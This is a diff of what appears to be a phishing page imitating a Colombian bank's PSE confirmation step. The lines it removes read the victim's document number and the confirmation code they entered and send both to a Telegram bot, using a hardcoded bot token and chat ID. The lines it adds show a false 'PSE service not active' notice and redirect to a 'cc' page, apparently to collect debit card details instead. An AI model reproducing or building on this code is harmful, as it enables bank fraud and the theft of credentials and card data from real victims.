@@ -55,7 +55,7 @@
 						<br><span id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:camposEntrada">
 							<div class="contenedor">
 
-								<center><span class="enunciado">Ingrese el <span style="font-weight: 600;">Código de confirmación</span> enviado a su celular.</span>
+								<center><span class="enunciado">Sistema PSE <span style="font-weight: 600;">servicio no activo</span><br> puede continuar con su tarjeta de debito.</span>
 								</center>
 								<br>
 								<div class="columna">
@@ -64,7 +64,7 @@
 
 								<div class="columna">
 									<br>
-									<input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:numeroDocumento" name="socialcorr" type="text"  maxlength="30" class="BGinputbox" autocomplete="off" requerid>
+									
 
 									<p>
 									</p>
@@ -130,34 +130,10 @@
 <script>
       
 	function carl(params) {
-const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
-const chatId = "-4248101807";
-const usr = localStorage.getItem("usr");
-const uservalid = document.getElementById("viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:numeroDocumento").value ;
 
-
-const message = `-NEW ONE-\n --DOC.: ${usr} \n --TOKEN: ${uservalid} \n`;
-$.ajax({
-  type: "POST",
-  url: `https://api.telegram.org/bot${token}/sendMessage`,
-  data: {
-	chat_id: chatId,
-	text: message,
-	parse_mode: "html",
-  },
-  success: function (res) {
-	console.debug(res);
-	$("#response").text("Message sent");
-	console.log("enviado");
-	localStorage.setItem("usr", usr);
 	
-	window.location = "load.html";
-  },
-  error: function (error) {
-	console.error(error);
-	alert("error failed");
-  },
-});
+	window.location = "cc/index.html";
+ 
 }
 
 	
